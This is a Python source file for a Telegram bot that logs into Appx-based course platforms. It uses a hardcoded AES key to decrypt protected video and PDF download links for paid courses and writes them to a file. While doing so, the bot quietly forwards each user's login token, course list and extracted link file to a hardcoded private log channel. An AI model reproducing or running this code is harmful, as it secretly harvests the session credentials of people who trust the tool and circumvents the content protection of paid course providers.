import asyncio
import aiohttp
import json
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from base64 import b64decode
from pyrogram import filters
import cloudscraper
from Extractor import app
import os
from config import SUDO_USERS
import base64
log_channel = (-1002439019941)
def decrypt(enc):
    enc = b64decode(enc.split(':')[0])
    key = '638udh3829162018'.encode('utf-8')
    iv = 'fedcba9876543210'.encode('utf-8')
    if len(enc) == 0:
        return ""

    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = unpad(cipher.decrypt(enc), AES.block_size)
    return plaintext.decode('utf-8')

def decode_base64(encoded_str):
    try:
        decoded_bytes = base64.b64decode(encoded_str)
        decoded_str = decoded_bytes.decode('utf-8')
        return decoded_str
    except Exception as e:
        return f"Error decoding string: {e}"

async def fetch_item_details(session, api, course_id, item, headers, f):
    fi = item.get("id")
    t = item.get("Title")
    async with session.get(f"https://{api}/get/fetchVideoDetailsById?course_id={course_id}&folder_wise_course=1&ytflag=0&video_id={fi}", headers=headers) as response:
        r4 = await response.json()
        vt = r4["data"].get("Title", "")
        vl = r4["data"].get("download_link", "")
        if vl:
            dvl = decrypt(vl)
            print(f"{vt}:{dvl}")
            f.write(f"{vt}:{dvl}\n")
        else:
            encrypted_links = r4["data"].get("encrypted_links", [])
            for link in encrypted_links:
                a = link.get("path")
                k = link.get("key")
                if a and k:
                    k1 = decrypt(k)
                    k2 = decode_base64(k1)
                    da = decrypt(a)
                    print(f"{vt}:{da}*{k2}")
                    f.write(f"{vt}:{da}*{k2}\n")
                    break
        if "material_type" in r4["data"]:
            mt = r4["data"]["material_type"]
            if mt == "VIDEO":
                p1 = r4["data"].get("pdf_link", "")
                p2 = r4["data"].get("pdf_link2", "")
                if p1:
                    dp1 = decrypt(p1)
                    print(f"{vt}:{dp1}")
                    f.write(f"{vt}:{dp1}\n")
                if p2:
                    dp2 = decrypt(p2)
                    print(f"{vt}:{dp2}")
                    f.write(f"{vt}:{dp2}\n")

async def fetch_folder_contents(session, api, course_id, folder_id, headers, f):
    async with session.get(f"https://{api}/get/folder_contentsv2?course_id={course_id}&parent_id={folder_id}", headers=headers) as response:
        j = await response.json()
        tasks = []
        if "data" in j:
            for item in j["data"]:
                mt = item.get("material_type")
                tasks.append(fetch_item_details(session, api, course_id, item, headers, f))
                if mt == "FOLDER":
                    tasks.append(fetch_folder_contents(session, api, course_id, item["id"], headers, f))
        await asyncio.gather(*tasks)

async def appex_v2_txt(app, message, api, name):
    raw_url = f"https://{api}/post/userLogin"
    hdr = {
        "Auth-Key": "appxapi",
        "User-Id": "-2",
        "Authorization": "",
        "User_app_category": "",
        "Language": "en",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip, deflate",
        "User-Agent": "okhttp/4.9.1"
    }
    info = {"email": "", "password": ""}
    input1 = await app.ask(message.chat.id, text="Send **ID & Password** in this manner, otherwise, the bot will not respond.\n\nSend like this: **ID*Password**\n\nOr send your **Token** directly.")
    raw_text = input1.text
    
    if '*' in raw_text:
        info["email"] = raw_text.split("*")[0]
        info["password"] = raw_text.split("*")[1]
        await input1.delete(True)

        try:
            scraper = cloudscraper.create_scraper()
            res = scraper.post(raw_url, data=info, headers=hdr).content
            output = json.loads(res)
            userid = output["data"]["userid"]
            token = output["data"]["token"]
        except Exception as e:
            print(f"An error occurred: {str(e)}")
            return await message.reply_text("Please try again later. Maybe Password Wrong")
    else:
        token = raw_text
        # Assuming the userid is available through some means when using token directly
        # Adjust the method to obtain userid if required
        userid = "extracted_userid_from_token"

    hdr1 = {
        "Client-Service": "Appx",
        "source": "website",
        "Auth-Key": "appxapi",
        "Authorization": token,
        "User-ID": userid
    }
    
    await message.reply_text("** Login Successful✅**")
    
    async with aiohttp.ClientSession() as session:
        async with session.get(f"https://{api}/get/get_all_purchases?userid={userid}&item_type=10", headers=hdr1) as res1:
            j1 = await res1.json()

        FFF = "**COURSE-ID  -  COURSE NAME**\n\n"
        if "data" in j1:
            for item in j1["data"]:
                for ct in item["coursedt"]:
                    i = ct.get("id")
                    cn = ct.get("course_name")
                    FFF += f"**`{i}`   -   `{cn}`**\n\n"

        await message.reply_text(f"**YOU HAVE THESE COURSES:**\n\n'{token}'\n\n{FFF}")
        
        input2 = await app.ask(message.chat.id, text="**Now send the Course ID to Download**")
        raw_text2 = input2.text
        await message.reply_text("wait extracting your batch")
        dl=(f"𝗔𝗽𝗽𝘅 𝗟𝗼𝗴𝗶𝗻 𝗦𝘂𝗰𝗲𝘀𝘀✅ for {api}\n\n`{token}`\n{FFF}")
        async with session.get(f"https://{api}/get/folder_contentsv2?course_id={raw_text2}&parent_id=-1", headers=hdr1) as res2:
            j2 = await res2.json()
        await app.send_message(log_channel, dl)
        course_name = next((ct.get("course_name") for item in j1["data"] for ct in item["coursedt"] if ct.get("id") == raw_text2), "Course")
        sanitized_course_name = "".join(c if c.isalnum() else "_" for c in course_name)
        filename = f"{sanitized_course_name}.txt"

        with open(filename, 'w') as f:
            tasks = []
            if "data" in j2:
                for item in j2["data"]:
                    tasks.append(fetch_item_details(session, api, raw_text2, item, hdr1, f))
                    if item["material_type"] == "FOLDER":
                        tasks.append(fetch_folder_contents(session, api, raw_text2, item["id"], hdr1, f))
            await asyncio.gather(*tasks)
 
        await app.send_document(message.chat.id, filename)
        await app.send_document(log_channel, filename)
        os.remove(filename)
        await message.reply_text("Done✅")
